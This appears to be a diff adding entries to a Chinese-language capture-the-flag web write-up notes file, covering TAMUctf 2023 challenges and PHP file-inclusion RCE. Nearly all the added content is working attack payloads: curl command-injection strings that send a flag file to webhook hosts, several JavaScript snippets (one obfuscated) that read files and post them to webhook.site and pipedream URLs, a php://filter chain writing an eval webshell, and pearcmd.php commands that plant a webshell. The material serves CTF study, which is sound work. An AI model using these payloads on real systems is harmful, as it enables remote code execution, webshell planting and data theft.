@@ -1371,8 +1371,76 @@ if(isset($_GET['content'])) {
 ?content=npfs.php&_=system("ls /");
 ```
 
-这道题因为会不断执行file_put_contents，所以每个shell只能利用一次，执行一条命令后需要重新上传。第二种：利⽤ zlib 的 zlib.deflate 和 zlib.inflate 来做，中间插⼊string.tolower，把空格和exit处理掉。而插入'%0d'是因为php标签是独立的,需要与php代码分割开。正好%0d是换行的url编码，可以用来分割。
+这道题因为会不断执行file_put_contents，所以每个shell只能利用一次，执行一条命令后需要重新上传。第二种：利⽤ zlib 的 zlib.deflate 和 zlib.inflate 来做，中间插⼊string.tolower，把空格和exit处理掉。而插入'%0d'是因为php标签是独立的,需要与php代码分割开。正好%0d是`\r`的url编码，可以用来分割。
 ```
 ?content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?%3E%3C?php%0Deval($_POST[pass]);?%3E/resource=shell.php
 (post ?content=shell.php)pass=system("ls /");
+```
+197. [Connect](https://github.com/tamuctf/tamuctf-2023/tree/master/web/connect)
+- curl命令注入带出flag的几种方法
+```python
+command = "curl -s -D - -o /dev/null " + url
+print(os.popen(command).read().strip())
+```
+    - 直接闭合使用shell命令cat出flag：`;cat flag.txt`
+    - 闭合后再次使用curl将flag带出到webhook的url上：`; curl -s webhook/$(cat /flag.txt)`
+        - 不使用分号闭合：`http://example.com+file:///flag.txt%0a`
+        - 使用curl的参数1:`--upload-file /flag.txt {remote_server}`;2:`http://[link-webhook]/?c= -d @/flag.txt`;3:`-d @flag.txt webhook`或`-X POST -d @/flag.txt webhook`
+198. [Migraine](https://github.com/tamuctf/tamuctf-2023/tree/master/web/migraine)
+- js任意命令执行，但不能包含字母和数字且无回显。无字母数字这点可以用jsfuck绕过，无回显说明要把flag带到webhook上。但jsfuck中不能使用require,因为require只能在module中使用。只能用全局object process（process.mainModule.require）来访问系统api。
+```js
+var url = "webhook";
+var n = 100;
+var buffer = Buffer.allocUnsafe(n);
+var fs = process.binding('fs');
+var path = "flag.txt";
+var fd = fs.open(path, 2, 3, 4, 5);
+fs.read(fd, buffer, 0, n, 0, 0, 0);
+var flag = buffer.toString();
+fetch(url + "?flag=" + flag);
+```
+```js
+process.mainModule.require('https').request({
+    hostname: 'webhook.site',
+    path: '/149f5661-002a-4618-8760-b7f1b8a0a7c4',
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Content-Length': process.mainModule.require('fs').readFileSync('/flag.txt').toString().length
+    }
+}).write(process.mainModule.require('fs').readFileSync('/flag.txt').toString())
+```
+```js
+fetch(["https"].concat(atob("Og==")).concat("//enmxw9zlg1zp.x.pipedream.net/data=").concat(process[Object.keys(process)[74]].require(["child"].concat(Object.keys(process)[71][0]).concat("process").join("")).execSync("cat /flag.txt").toString()).join(""))
+```
+```js
+const js = `
+import * as fs from 'node:fs';
+fs.readFile('/flag.txt', 'utf8', (err, data) => {
+  if (err) {
+    fetch("https://webhook.site/5fa7108c-ebb7-4e4f-ac39-90118458370b/" + "failed");
+    return;
+  }
+  fetch("https://webhook.site/5fa7108c-ebb7-4e4f-ac39-90118458370b/" + data);
+});
+`;
+// This is a trick to get access to import https://2ality.com/2019/10/eval-via-import.html
+const encodedJs = encodeURIComponent(js);
+const dataUri = 'data:text/javascript;charset=utf-8,' + encodedJs;
+import(dataUri);
+```
+```js
+process.mainModule.require("express").response.send=function(){this.end(process.mainModule.constructor._load("fs").readFileSync("/flag.txt","utf-8"))}
+```
+- 另一种无字母数字的js写法：https://github.com/mrpapercut/nonalpha-js-obfuscator。
+199. php文件包含rce。
+```php
+<?php
+include $_REQUEST['file'];
+```
+
+当可以完全控制require/include的文件名时，就能使用[脚本](https://github.com/synacktiv/php_filter_chain_generator)获取rce payload:`python3 filter_chain.py — chain '<?php system("cat /flag.txt");?>'`.或者使用pearcmd.php上传木马getshell。
+```
+curl "http://example.com/?page=/usr/local/lib/php/pearcmd&+-c+/tmp/webshell.php+-d+man_dir=<?echo(system(\$_GET\['cmd'\]));?>+-s+"
+curl "http://example.com/?page=/tmp/webshell&cmd=cat+/flag.txt"
 ```
